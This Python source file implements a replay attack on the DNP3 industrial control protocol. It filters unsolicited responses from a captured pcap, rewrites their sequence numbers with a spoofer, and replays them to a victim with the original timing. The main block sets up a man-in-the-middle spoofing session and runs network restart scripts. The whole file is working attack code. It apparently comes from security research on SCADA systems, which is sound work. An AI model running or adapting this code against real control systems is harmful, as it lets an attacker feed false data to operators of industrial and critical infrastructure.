__author__ = 'Nicholas Rodofile'
from DNP3_Slave import *

class DNP3_Slave_Replay(Slave):
    def __init__(self, node, port, pcap='mitm/replay_20160225_1634.pcap', timeout_time=(60 * 2)):
        Slave.__init__(self, node, port, timeout_time=timeout_time)
        self.pcap = rdpcap(pcap)
        self.replay_messages = []

    def filter_pcap(self):
        for p in self.pcap:
            if p.haslayer(DNP3ApplicationResponse):
                if applicationFunctionCode[p[DNP3ApplicationResponse].FUNC_CODE] == "UNSOLICITED_RESPONSE":
                    self.replay_messages.append(p)

    def replay(self):
        print len(self.replay_messages), "Replay Packets"
        if len(self.replay_messages) > 0:
            m = 0
            message = self.replay_messages[m]
            self.node.spoofer.increment_sequence()
            message[DNP3Transport].SEQUENCE = self.node.spoofer.dnp3_spoof_sequence
            message[DNP3ApplicationResponse].Application_control.SEQ = m
            wait_time = message.time
            self.queue_out.put(message[DNP3])
            m += 1
            while m < len(self.replay_messages[1:]) and self.running:
                message = self.replay_messages[1:][m]
                sleep_time = message.time - wait_time
                time.sleep(sleep_time)
                self.node.spoofer.increment_sequence()
                message[DNP3Transport].SEQUENCE = self.node.spoofer.dnp3_spoof_sequence
                message[DNP3ApplicationResponse].Application_control.SEQ = m
                self.queue_out.put(message[DNP3])
                wait_time = message.time
                m += 1

    def automation(self):
        print "Automation running...Slave Replay"
        self.filter_pcap()
        self.replay()
        self.running = False
        print "Replay Done..."
        self.socket.close()

if __name__ == '__main__':
    replay_file = 'mitm/replay_20160225_1634.pcap'
    while True:

        mitm = DNP3_MITM_conf()
        mitm.init_spoofing()
        victim = mitm.victim
        subprocess.call("./networkrestart.sh")
        slave = DNP3_Slave_Replay(victim, dnp3_port, replay_file)
        DNP = slave.start()
        subprocess.call("./networkrestart_attacker.sh")
        quit()